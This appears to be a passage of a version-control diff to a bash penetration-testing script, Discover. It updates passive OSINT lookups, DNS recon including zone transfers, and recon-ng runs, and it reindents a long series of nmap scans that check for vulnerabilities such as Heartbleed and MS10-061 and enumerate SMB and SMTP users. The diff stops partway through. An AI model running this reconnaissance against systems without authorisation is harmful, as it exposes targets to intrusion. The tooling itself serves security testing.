      $web https://www.google.com/#q=filetype%3Appt+OR+filetype%3Apptx+site%3A$domain &
@@ -709,18 +845,15 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      sleep 2
      $web https://www.google.com/#q=filetype%3Atxt+site%3A$domain &
      sleep 2
-     $web https://connect.data.com/login &
+     $web https://dockets.justia.com/search?parties=%22$companyurl%22&cases=mostrecent &
      sleep 2
-     $web https://www.shodan.io/search?query=$domain &
-     sleep 2
-     companyurl=$( printf "%s\n" "$company" | sed 's/ /%20/g' )
      $web pastebin.com/search?cx=013305635491195529773%3A0ufpuq-fpt0\&cof=FORID%3A10\&ie=UTF-8\&q=$companyurl\&sa.x=0\&sa.y=0 &
      sleep 2
      $web http://www.reuters.com/finance/stocks/lookup?searchType=any\&search=$companyurl &
      sleep 2
      $web https://www.sec.gov/cgi-bin/browse-edgar?company=$companyurl\&owner=exclude\&action=getcompany &
      sleep 2
-     $web https://www.ssllabs.com/ssltest/analyze.html?d=$domain"&"hideResults=on"&"latest &
+     $web https://www.ssllabs.com/ssltest/analyze.html?d=$domain\&hideResults=on\&latest &
      sleep 2
      $web $home/data/$domain/index.htm &
      echo
@@ -729,6 +862,13 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      ;;
 
      2)
+     clear
+     f_banner
+
+     echo -e "\x1B[1;34mUses Nmap, dnsrecon, Fierce, lbd, WAF00W, traceroute, and Whatweb.\x1B[0m"
+     echo
+     echo -e "\x1B[1;34m[*] Acquire API keys for Bing, Builtwith, Fullcontact, GitHub, Google, Hashes, and\x1B[0m"
+     echo -e "\x1B[1;34mShodan for maximum results with recon-ng.\x1B[0m"
      echo
      echo $medium
      echo
@@ -745,12 +885,14 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      # If folder doesn't exist, create it
      if [ ! -d $home/data/$domain ]; then
           cp -R $discover/report/ $home/data/$domain
-          sed 's/REPLACEDOMAIN/'$domain'/' $home/data/$domain/index.htm > tmp
+          sed 's/REPLACEDOMAIN/'$domain'/g' $home/data/$domain/index.htm > tmp
           mv tmp $home/data/$domain/index.htm
      fi
 
      # Number of tests
      total=11
+
+     companyurl=$( printf "%s\n" "$company" | sed 's/ /%20/g;s/\&/%26/g;s/\,/%2C/g' )
 
      echo
      echo $medium
@@ -767,8 +909,8 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      dnsrecon -d $domain -t std > tmp
      egrep -v '(All queries|Bind Version for|Could not|Enumerating SRV|It is resolving|not configured|Performing|Records Found|Recursion|Resolving|TXT|Wildcard)' tmp > tmp2
      # Remove first 6 characters from each line
-     sed 's/^......//' tmp2 | awk '{print $2,$1,$3,$4,$5,$6,$7,$8,$9,$10}' | column -t | sort -u -k2 -k1 > tmp3
-     grep 'TXT' tmp | sed 's/^......//' | awk '{print $2,$1,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15}' >> tmp3
+     sed 's/^......//g' tmp2 | awk '{print $2,$1,$3,$4,$5,$6,$7,$8,$9,$10}' | column -t | sort -u -k2 -k1 > tmp3
+     grep 'TXT' tmp | sed 's/^......//g' | awk '{print $2,$1,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15}' >> tmp3
      egrep -v '(SEC3|SKEYs|SSEC)' tmp3 > records
      cat $home/data/$domain/data/records.htm records | grep -v '<' | column -t | sort -u -k2 -k1 > tmp3
 
@@ -777,7 +919,7 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
 
      echo "     Zone Transfer        (3/$total)"
      dnsrecon -d $domain -t axfr > tmp
-     egrep -v '(Checking for|Failed|filtered|NS Servers|Removing|TCP Open|Testing NS)' tmp | sed 's/^....//' | sed /^$/d > zonetransfer
+     egrep -v '(Checking for|Failed|filtered|NS Servers|Removing|TCP Open|Testing NS)' tmp | sed 's/^....//g' | sed /^$/d > zonetransfer
 
      echo "     Sub-domains (~5 min) (4/$total)"
      if [ -f /usr/share/dnsrecon/namelist.txt ]; then
@@ -804,7 +946,7 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
 
      sed -n '/Now performing/,/Subnets found/p' tmp4 | grep $domain | awk '{print $2 " " $1}' | column -t | sort -u > subdomains-fierce
 
-     cat subdomains-dnsrecon subdomains-fierce | egrep -v '(.nat.|1.1.1.1|6.9.6.9|127.0.0.1)' | column -t | sort -u | awk '$2 !~ /[a-z]/' > subdomains
+     cat subdomains-dnsrecon subdomains-fierce | egrep -v '(.nat.|1.1.1.1|6.9.6.9|127.0.0.1)' | column -t | tr '[A-Z]' '[a-z]' | sort -u | awk '$2 !~ /[a-z]/' > subdomains
 
      if [ -e $home/data/$domain/data/subdomains.htm ]; then
           cat $home/data/$domain/data/subdomains.htm subdomains | grep -v "<" | grep -v "$domain\." | column -t | sort -u > subdomains-combined
@@ -820,16 +962,10 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      echo
      echo "Loadbalancing             (6/$total)"
      lbd $domain > tmp 2>/dev/null
-     egrep -v '(Checks if a given|Written by|Proof-of-concept)' tmp > tmp2
-     # Remove leading whitespace from file
-     awk '!d && NF {sub(/^[[:blank:]]*/,""); d=1} d' tmp2 > tmp3
-     # Remove leading whitespace from each line
-     sed 's/^[ \t]*//' tmp3 > tmp4
-     egrep -v '(does Load-balancing|does NOT use Load-balancing)' tmp4 | sed 's/Checking for //g' > tmp5
-     # Remove blank lines from end of file
-     awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}' tmp5 > tmp6
-     # Clean up
-     cat -s tmp6 | grep -v 'P3P' > loadbalancing
+     # Remove first 5 lines & clean up
+     sed '1,5d' tmp | sed 's/DNS-Loadbalancing: NOT FOUND/DNS-Loadbalancing:\nNOT FOUND\n/g' | sed 's/\[Date\]: /\[Date\]:\n/g' | sed 's/\[Diff\]: /\[Diff\]:\n/g' > tmp2
+     # Replace the 10th comma with a new line & remove leading whitespace from each line
+     sed 's/\([^,]*,\)\{9\}[^,]*,/&\n/g' tmp2 | sed 's/^[ \t]*//' | sed 's/, NOT/\nNOT/g' | grep -v 'NOT use' > loadbalancing
 
      echo
      echo "Web Application Firewall  (7/$total)"
@@ -857,7 +993,7 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      echo
      echo "Whatweb                   (11/$total)"
      grep -v '<' $home/data/$domain/data/subdomains.htm | awk '{print $1}' > tmp
-     whatweb -i tmp --color=never --no-errors -t 255 > tmp2
+     whatweb -i tmp --color=never --no-errors -t 255 > tmp2 2>/dev/null
      # Find lines that start with http, and insert a line after
      sort tmp2 | sed '/^http/a\ ' > tmp3
      # Cleanup
@@ -874,6 +1010,16 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      if [ ! -s hosts ]; then rm hosts; fi
      if [ ! -s records ]; then rm records; fi
      if [ ! -s subdomains ]; then rm subdomains; fi
+
+     echo
+     echo "recon-ng                  (12/$total)"
+     cp $discover/resource/recon-ng-active.rc $discover/
+     sed -i "s/xxx/$companyurl/g" $discover/recon-ng-active.rc
+     sed -i 's/%26/\&/g;s/%20/ /g;s/%2C/\,/g' $discover/recon-ng-active.rc
+     sed -i "s/yyy/$domain/g" $discover/recon-ng-active.rc
+     recon-ng --no-check -r $discover/recon-ng-active.rc
+
+     grep "$domain" /tmp/subdomains | grep -v '>' | awk '{print $2,$4}' | column -t > sub-recon
 
      ##############################################################
 
@@ -963,7 +1109,8 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      echo '<pre style="font-size:14px;">' > $home/data/$domain/data/hosts.htm
      cat tmp >> $home/data/$domain/data/hosts.htm; echo "</pre>" >> $home/data/$domain/data/hosts.htm
 
-     rm emails* hosts loadbalancing records sub* tmp* waf whatweb z*
+     mv recon-ng-active.rc $home/data/$domain/ 2>/dev/null
+     rm emails* hosts loadbalancing records sub* tmp* waf whatweb z* 2>/dev/null
 
      echo
      echo $medium
@@ -975,7 +1122,7 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      echo
      echo
 
-	 $web $home/data/$domain/index.htm &
+     $web $home/data/$domain/index.htm &
      exit
      ;;
 
@@ -1311,15 +1458,16 @@ read choice
 case $choice in
      1) f_errorOSX
 
-	 echo -n "Interface to scan: "
-	 read interface
+     echo
+     echo -n "Interface to scan: "
+     read interface
 
      # Check for no answer
      if [[ -z $interface ]]; then
           f_error
      fi
 
-	 arp-scan -l -I $interface | egrep -v '(arp-scan|Interface|packets|Polycom|Unknown)' | awk '{print $1}' | $sip | sed '/^$/d' > $home/data/hosts-arp.txt
+     arp-scan -l -I $interface | egrep -v '(arp-scan|Interface|packets|Polycom|Unknown)' | awk '{print $1}' | $sip | sed '/^$/d' > $home/data/hosts-arp.txt
 
      echo $medium
      echo
@@ -1440,19 +1588,18 @@ undef $/; # Enable slurping
 
 open(my $handle, '<', "tmp");
 open(my $output, '>', "tmp2");
-while(<$handle>)
-{
-	# Read report lines
-	while (/((?:[\x00-\xFF]*?(?=Nmap\s+scan\s+report)|[\x00-\xFF]*))/mixg) {
-		my $report = $1;
+while(<$handle>){
+     # Read report lines
+     while (/((?:[\x00-\xFF]*?(?=Nmap\s+scan\s+report)|[\x00-\xFF]*))/mixg){
+          my $report = $1;
 
-		# Print IP if host is REALLY up
-		if (($report =~ /MAC\s+Address/mix)
-		or ($report =~ /Nmap\s+scan\s+report\s+for\s+\S+?\s+\(\S+\)/mix)) {
-			my ($ip) = $report =~ /(\d+\.\d+\.\d+\.\d+)/mix;
-			print $output "$ip\n";
-		}
-	}
+          # Print IP if host is really up
+          if (($report =~ /MAC\s+Address/mix)
+          or ($report =~ /Nmap\s+scan\s+report\s+for\s+\S+?\s+\(\S+\)/mix)){
+               my ($ip) = $report =~ /(\d+\.\d+\.\d+\.\d+)/mix;
+               print $output "$ip\n";
+          }
+     }
 }
 EOF
 
@@ -1820,103 +1967,103 @@ echo -e "\x1B[1;34mRunning nmap scripts.\x1B[0m"
 
 # If the file for the corresponding port doesn't exist, skip
 if [[ -e $name/13.txt ]]; then
-	echo "     Daytime"
-	nmap -iL $name/13.txt -Pn -n --open -p13 --script=daytime --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-13.txt
+     echo "     Daytime"
+     nmap -iL $name/13.txt -Pn -n --open -p13 --script=daytime --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-13.txt
 fi
 
 if [[ -e $name/21.txt ]]; then
-	echo "     FTP"
-	nmap -iL $name/21.txt -Pn -n --open -p21 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-21.txt
+     echo "     FTP"
+     nmap -iL $name/21.txt -Pn -n --open -p21 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-21.txt
 fi
 
 if [[ -e $name/22.txt ]]; then
-	echo "     SSH"
-	nmap -iL $name/22.txt -Pn -n --open -p22 --script=sshv1,ssh2-enum-algos --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-22.txt
+     echo "     SSH"
+     nmap -iL $name/22.txt -Pn -n --open -p22 --script=sshv1,ssh2-enum-algos --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-22.txt
 fi
 
 if [[ -e $name/23.txt ]]; then
-	echo "     Telnet"
-	nmap -iL $name/23.txt -Pn -n --open -p23 --script=banner,telnet-encryption --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-23.txt
+     echo "     Telnet"
+     nmap -iL $name/23.txt -Pn -n --open -p23 --script=banner,telnet-encryption --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-23.txt
 fi
 
 if [[ -e $name/smtp.txt ]]; then
-	echo "     SMTP"
-	nmap -iL $name/smtp.txt -Pn -n --open -p25,465,587 --script=banner,smtp-commands,smtp-open-relay,smtp-strangeport,smtp-enum-users,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --script-args smtp-enum-users.methods={EXPN,RCPT,VRFY} --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-25.txt
+     echo "     SMTP"
+     nmap -iL $name/smtp.txt -Pn -n --open -p25,465,587 --script=banner,smtp-commands,smtp-open-relay,smtp-strangeport,smtp-enum-users,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --script-args smtp-enum-users.methods={EXPN,RCPT,VRFY} --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-25.txt
 fi
 
 if [[ -e $name/37.txt ]]; then
-	echo "     Time"
-	nmap -iL $name/37.txt -Pn -n --open -p37 --script=rfc868-time --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-37.txt
+     echo "     Time"
+     nmap -iL $name/37.txt -Pn -n --open -p37 --script=rfc868-time --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-37.txt
 fi
 
 if [[ -e $name/53.txt ]]; then
-	echo "     DNS"
-	nmap -iL $name/53.txt -Pn -n -sU --open -p53 --script=dns-blacklist,dns-cache-snoop,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-update,dns-zeustracker,dns-zone-transfer --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-53.txt
+     echo "     DNS"
+     nmap -iL $name/53.txt -Pn -n -sU --open -p53 --script=dns-blacklist,dns-cache-snoop,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-update,dns-zeustracker,dns-zone-transfer --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-53.txt
 fi
 
 if [[ -e $name/67.txt ]]; then
-	echo "     DHCP"
-	nmap -iL $name/67.txt -Pn -n -sU --open -p67 --script=dhcp-discover --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-67.txt
+     echo "     DHCP"
+     nmap -iL $name/67.txt -Pn -n -sU --open -p67 --script=dhcp-discover --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-67.txt
 fi
 
 if [[ -e $name/70.txt ]]; then
-	echo "     Gopher"
-	nmap -iL $name/70.txt -Pn -n --open -p70 --script=gopher-ls --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-70.txt
+     echo "     Gopher"
+     nmap -iL $name/70.txt -Pn -n --open -p70 --script=gopher-ls --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-70.txt
 fi
 
 if [[ -e $name/79.txt ]]; then
-	echo "     Finger"
-	nmap -iL $name/79.txt -Pn -n --open -p79 --script=finger --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-79.txt
+     echo "     Finger"
+     nmap -iL $name/79.txt -Pn -n --open -p79 --script=finger --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-79.txt
 fi
 
 if [[ -e $name/110.txt ]]; then
-	echo "     POP3"
-	nmap -iL $name/110.txt -Pn -n --open -p110 --script=banner,pop3-capabilities,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-110.txt
+     echo "     POP3"
+     nmap -iL $name/110.txt -Pn -n --open -p110 --script=banner,pop3-capabilities,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-110.txt
 fi
 
 if [[ -e $name/111.txt ]]; then
-	echo "     NFS"
-	nmap -iL $name/111.txt -Pn -n --open -p111 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-111.txt
+     echo "     NFS"
+     nmap -iL $name/111.txt -Pn -n --open -p111 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-111.txt
 fi
 
 if [[ -e $name/123.txt ]]; then
-	echo "     NTP"
-	nmap -iL $name/123.txt -Pn -n -sU --open -p123 --script=ntp-monlist --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-123.txt
+     echo "     NTP"
+     nmap -iL $name/123.txt -Pn -n -sU --open -p123 --script=ntp-monlist --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-123.txt
 fi
 
 if [[ -e $name/137.txt ]]; then
-	echo "     NetBIOS"
-	nmap -iL $name/137.txt -Pn -n -sU --open -p137 --script=nbstat --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	sed -i '/^MAC/{n; /.*/d}' tmp4		# Find lines that start with MAC, and delete the following line
-	sed -i '/^137\/udp/{n; /.*/d}' tmp4	# Find lines that start with 137/udp, and delete the following line
-	mv tmp4 $name/script-137.txt
+     echo "     NetBIOS"
+     nmap -iL $name/137.txt -Pn -n -sU --open -p137 --script=nbstat --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     sed -i '/^MAC/{n; /.*/d}' tmp4		# Find lines that start with MAC, and delete the following line
+     sed -i '/^137\/udp/{n; /.*/d}' tmp4	# Find lines that start with 137/udp, and delete the following line
+     mv tmp4 $name/script-137.txt
 fi
 
 if [[ -e $name/139.txt ]]; then
@@ -1930,487 +2077,487 @@ if [[ -e $name/139.txt ]]; then
 fi
 
 if [[ -e $name/143.txt ]]; then
-	echo "     IMAP"
-	nmap -iL $name/143.txt -Pn -n --open -p143 --script=imap-capabilities,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-143.txt
+     echo "     IMAP"
+     nmap -iL $name/143.txt -Pn -n --open -p143 --script=imap-capabilities,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-143.txt
 fi
 
 if [[ -e $name/161.txt ]]; then
-	echo "     SNMP"
-	nmap -iL $name/161.txt -Pn -n -sU --open -p161 --script=snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-161.txt
+     echo "     SNMP"
+     nmap -iL $name/161.txt -Pn -n -sU --open -p161 --script=snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-161.txt
 fi
 
 if [[ -e $name/389.txt ]]; then
-	echo "     LDAP"
-	nmap -iL $name/389.txt -Pn -n --open -p389 --script=ldap-rootdse,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-389.txt
+     echo "     LDAP"
+     nmap -iL $name/389.txt -Pn -n --open -p389 --script=ldap-rootdse,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-389.txt
 fi
 
 if [[ -e $name/445.txt ]]; then
-	echo "     SMB"
-	nmap -iL $name/445.txt -Pn -n --open -p445 --script=msrpc-enum,smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-mbenum,smb-os-discovery,smb-security-mode,smb-server-stats,smb-system-info,smbv2-enabled,stuxnet-detect,smb-vuln-ms10-061 --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	sed -i '/^445/{n; /.*/d}' tmp4		# Find lines that start with 445, and delete the following line
-	mv tmp4 $name/script-445.txt
+     echo "     SMB"
+     nmap -iL $name/445.txt -Pn -n --open -p445 --script=msrpc-enum,smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-mbenum,smb-os-discovery,smb-security-mode,smb-server-stats,smb-system-info,smbv2-enabled,stuxnet-detect,smb-vuln-ms10-061 --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     sed -i '/^445/{n; /.*/d}' tmp4		# Find lines that start with 445, and delete the following line
+     mv tmp4 $name/script-445.txt
 fi
 
 if [[ -e $name/500.txt ]]; then
-	echo "     Ike"
-	nmap -iL $name/500.txt -Pn -n -sS -sU --open -p500 --script=ike-version -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-500.txt
+     echo "     Ike"
+     nmap -iL $name/500.txt -Pn -n -sS -sU --open -p500 --script=ike-version -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-500.txt
 fi
 
 if [[ -e $name/db2.txt ]]; then
-	echo "     DB2"
-	nmap -iL $name/db2.txt -Pn -n -sS -sU --open -p523 --script=db2-das-info,db2-discover --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-523.txt
+     echo "     DB2"
+     nmap -iL $name/db2.txt -Pn -n -sS -sU --open -p523 --script=db2-das-info,db2-discover --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-523.txt
 fi
 
 if [[ -e $name/524.txt ]]; then
-	echo "     Novell NetWare Core Protocol"
-	nmap -iL $name/524.txt -Pn -n --open -p524 --script=ncp-enum-users,ncp-serverinfo --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-524.txt
+     echo "     Novell NetWare Core Protocol"
+     nmap -iL $name/524.txt -Pn -n --open -p524 --script=ncp-enum-users,ncp-serverinfo --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-524.txt
 fi
 
 if [[ -e $name/548.txt ]]; then
-	echo "     AFP"
-	nmap -iL $name/548.txt -Pn -n --open -p548 --script=afp-ls,afp-path-vuln,afp-serverinfo,afp-showmount --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-548.txt
+     echo "     AFP"
+     nmap -iL $name/548.txt -Pn -n --open -p548 --script=afp-ls,afp-path-vuln,afp-serverinfo,afp-showmount --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-548.txt
 fi
 
 if [[ -e $name/554.txt ]]; then
-	echo "     RTSP"
-	nmap -iL $name/554.txt -Pn -n --open -p554 --script=rtsp-methods --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-554.txt
+     echo "     RTSP"
+     nmap -iL $name/554.txt -Pn -n --open -p554 --script=rtsp-methods --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-554.txt
 fi
 
 if [[ -e $name/631.txt ]]; then
-	echo "     CUPS"
-	nmap -iL $name/631.txt -Pn -n --open -p631 --script=cups-info,cups-queue-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-631.txt
+     echo "     CUPS"
+     nmap -iL $name/631.txt -Pn -n --open -p631 --script=cups-info,cups-queue-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-631.txt
 fi
 
 if [[ -e $name/636.txt ]]; then
-	echo "     LDAP/S"
-	nmap -iL $name/636.txt -Pn -n --open -636 --script=ldap-rootdse,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-636.txt
+     echo "     LDAP/S"
+     nmap -iL $name/636.txt -Pn -n --open -636 --script=ldap-rootdse,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-636.txt
 fi
 
 if [[ -e $name/873.txt ]]; then
-	echo "     rsync"
-	nmap -iL $name/873.txt -Pn -n --open -p873 --script=rsync-list-modules --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-873.txt
+     echo "     rsync"
+     nmap -iL $name/873.txt -Pn -n --open -p873 --script=rsync-list-modules --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-873.txt
 fi
 
 if [[ -e $name/993.txt ]]; then
-	echo "     IMAP/S"
-	nmap -iL $name/993.txt -Pn -n --open -p993 --script=banner,sslv2,imap-capabilities,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-993.txt
+     echo "     IMAP/S"
+     nmap -iL $name/993.txt -Pn -n --open -p993 --script=banner,sslv2,imap-capabilities,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
+     f_cleanup
+     mv tmp4 $name/script-993.txt
 fi
 
 if [[ -e $name/995.txt ]]; then
-	echo "     POP3/S"
-	nmap -iL $name/995.txt -Pn -n --open -p995 --script=banner,sslv2,pop3-capabilities,ssl-dh-params,ssl-enum-ciphers,ssl-ccs-injection,ssl-heartbleed,ssl-poodle,ssl-date,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
-	f_cleanup
-	mv tmp4 $name/script-995.txt
+     echo "     POP3/S"
